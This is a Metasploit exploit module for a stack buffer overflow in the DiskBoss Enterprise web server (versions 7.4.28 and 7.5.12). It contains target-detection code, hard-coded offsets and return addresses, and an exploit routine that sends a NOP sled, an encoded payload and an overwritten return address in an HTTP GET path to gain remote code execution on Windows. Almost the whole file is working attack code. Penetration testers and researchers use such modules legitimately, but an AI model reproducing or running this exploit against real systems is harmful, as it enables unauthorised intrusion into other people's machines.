# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Seh
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DiskBoss Enterprise GET Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow vulnerability
        in the web interface of DiskBoss Enterprise v7.5.12 and v7.4.28,
        caused by improper bounds checking of the request path in HTTP GET
        requests sent to the built-in web server. This module has been
        tested successfully on Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;vportal&#039;,      # Vulnerability discovery and PoC
          &#039;Gabor Seljan&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;40869&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;   => "\x00\x09\x0a\x0d\x20",
          &#039;Space&#039;      => 2000
        },
      &#039;Targets&#039;        =>
        [
          [
            &#039;Automatic Targeting&#039;,
            {
              &#039;auto&#039; => true
            }
          ],
          [
            &#039;DiskBoss Enterprise v7.4.28&#039;,
            {
              &#039;Offset&#039; => 2471,
              &#039;Ret&#039;    => 0x1004605c  # ADD ESP,0x68 # RETN [libpal.dll]
            }
          ],
          [
            &#039;DiskBoss Enterprise v7.5.12&#039;,
            {
              &#039;Offset&#039; => 2471,
              &#039;Ret&#039;    => 0x100461da  # ADD ESP,0x68 # RETN [libpal.dll]
            }
          ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Dec 05 2016&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/&#039;
    )

    if res && res.code == 200
      if res.body =~ /DiskBoss Enterprise v7\.(4\.28|5\.12)/
        return Exploit::CheckCode::Vulnerable
      elsif res.body =~ /DiskBoss Enterprise/
        return Exploit::CheckCode::Detected
      end
    else
      vprint_error(&#039;Unable to determine due to a HTTP connection timeout&#039;)
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    mytarget = target

    if target[&#039;auto&#039;]
      mytarget = nil

      print_status(&#039;Automatically detecting the target...&#039;)

      res = send_request_cgi(
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => &#039;/&#039;
      )

      if res && res.code == 200
        if res.body =~ /DiskBoss Enterprise v7\.4\.28/
          mytarget = targets[1]
        elsif res.body =~ /DiskBoss Enterprise v7\.5\.12/
          mytarget = targets[2]
        end
      end

      if !mytarget
        fail_with(Failure::NoTarget, &#039;No matching target&#039;)
      end

      print_status("Selected Target: #{mytarget.name}")
    end

    sploit =  make_nops(21)
    sploit << payload.encoded
    sploit << rand_text_alpha(mytarget[&#039;Offset&#039;] - payload.encoded.length)
    sploit << [mytarget.ret].pack(&#039;V&#039;)
    sploit << rand_text_alpha(2500)

    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => sploit
    )
  end
end

